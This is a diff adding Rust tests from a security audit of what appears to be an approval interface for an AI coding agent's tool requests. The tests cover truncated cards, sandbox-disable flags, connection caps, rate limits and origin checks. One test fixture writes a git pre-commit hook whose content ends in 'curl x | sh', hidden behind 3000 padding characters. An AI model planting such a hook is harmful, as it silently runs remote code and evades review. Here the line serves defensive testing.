@@ -851,3 +851,146 @@ async fn approval_input_requires_token() {
     assert_eq!(res.status().as_u16(), 403);
     t.stop().await;
 }
+
+// ============================================================================================================
+// Audit T5b
+// ============================================================================================================
+
+#[tokio::test]
+async fn truncated_card_allow_requires_full_view() {
+    // Finding 3: thẻ đã cắt nội dung không được allow "mù".
+    let t = T::start().await;
+    let (mut ws, _) = t.connect().await;
+    let h = t.permission(json!({
+        "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "D:/code",
+        "tool_name": "Write",
+        "tool_input": { "file_path": ".git/hooks/pre-commit", "content": format!("{}\ncurl x | sh", "#".repeat(3000)) },
+    }));
+    let card = next_of(&mut ws, &["approval_requested"]).await;
+    assert_eq!(card["approval"]["truncated"], true);
+    let id = card["approval"]["request_id"].as_str().unwrap().to_owned();
+
+    send(&mut ws, decide(&id, "allow", "user")).await;
+    assert_eq!(
+        next_of(&mut ws, &["feed"]).await["text"],
+        "Cần mở bản đầy đủ trước khi duyệt"
+    );
+    assert!(!h.is_finished());
+
+    // Mở bản đầy đủ rồi mới allow được.
+    let res = t
+        .http
+        .get(format!("http://{}/approvals/{id}/input", t.addr))
+        .header("authorization", format!("Bearer {UI}"))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(res.status().as_u16(), 200);
+    send(&mut ws, decide(&id, "allow", "user")).await;
+    assert_eq!(
+        next_of(&mut ws, &["approval_resolved"]).await["decision"],
+        "allow"
+    );
+    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
+    assert_eq!(
+        res.pointer("/hookSpecificOutput/decision/behavior"),
+        Some(&json!("allow"))
+    );
+
+    // Deny không cần mở bản đầy đủ.
+    let h = t.permission(json!({
+        "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "D:/code",
+        "tool_name": "Write", "tool_input": { "file_path": "/a", "content": "c".repeat(3000) },
+    }));
+    let id = requested_id(&mut ws).await;
+    send(&mut ws, decide(&id, "deny", "user")).await;
+    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
+    assert_eq!(
+        res.pointer("/hookSpecificOutput/decision/behavior"),
+        Some(&json!("deny"))
+    );
+    t.stop().await;
+}
+
+#[tokio::test]
+async fn bash_options_reach_the_card() {
+    // Finding 2: `dangerouslyDisableSandbox` phải hiện trên thẻ, tách khỏi lệnh.
+    let t = T::start().await;
+    let (mut ws, _) = t.connect().await;
+    let _h = t.permission(json!({
+        "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "D:/code",
+        "tool_name": "Bash",
+        "tool_input": { "command": "ls", "description": "d", "dangerouslyDisableSandbox": true },
+    }));
+    let card = next_of(&mut ws, &["approval_requested"]).await;
+    assert_eq!(card["approval"]["command_normalized"], "ls");
+    assert_eq!(
+        card["approval"]["tool_options"],
+        json!({ "dangerouslyDisableSandbox": "true" })
+    );
+    t.stop().await;
+}
+
+#[tokio::test]
+async fn ws_connections_are_capped() {
+    let t = T::start().await;
+    let mut open = Vec::new();
+    for _ in 0..ws::MAX_CLIENTS {
+        open.push(t.connect().await.0);
+    }
+    assert_eq!(t.ws.clients(), ws::MAX_CLIENTS);
+    let err = t
+        .connect_with(Some(UI), None, Some("http://tauri.localhost"), None)
+        .await
+        .unwrap_err();
+    assert_eq!(status_of(err), 503);
+    // Đóng một kết nối thì lại nhận được.
+    let mut first = open.remove(0);
+    first.close(None).await.unwrap();
+    tokio::time::timeout(WAIT, async {
+        while t.ws.clients() >= ws::MAX_CLIENTS {
+            tokio::time::sleep(Duration::from_millis(10)).await;
+        }
+    })
+    .await
+    .unwrap();
+    t.connect().await;
+    t.stop().await;
+}
+
+#[tokio::test]
+async fn team_commands_share_rate_limit() {
+    let t = T::start().await;
+    let (mut ws, _) = t.connect().await;
+    for i in 0..25 {
+        send(&mut ws, json!({ "t": "focus_set", "on": i % 2 == 0 })).await;
+    }
+    let mut limited = 0;
+    let mut updates = 0;
+    while updates + limited < 25 {
+        let v = next_of(&mut ws, &["feed", "team_updated"]).await;
+        if v["t"] == "feed" {
+            assert_eq!(v["text"], "Quá nhiều lệnh, hãy thử lại sau");
+            limited += 1;
+        } else {
+            updates += 1;
+        }
+    }
+    assert_eq!((updates, limited), (20, 5));
+    t.stop().await;
+}
+
+#[tokio::test]
+async fn vite_dev_origin_only_in_debug_builds() {
+    // Finding 8: cổng Vite mặc định không được tin ở bản release.
+    let t = T::start().await;
+    let r = t
+        .connect_with(Some(UI), None, Some("http://localhost:5173"), None)
+        .await;
+    if cfg!(debug_assertions) {
+        assert!(r.is_ok());
+    } else {
+        assert_eq!(status_of(r.unwrap_err()), 403);
+    }
+    t.stop().await;
+}
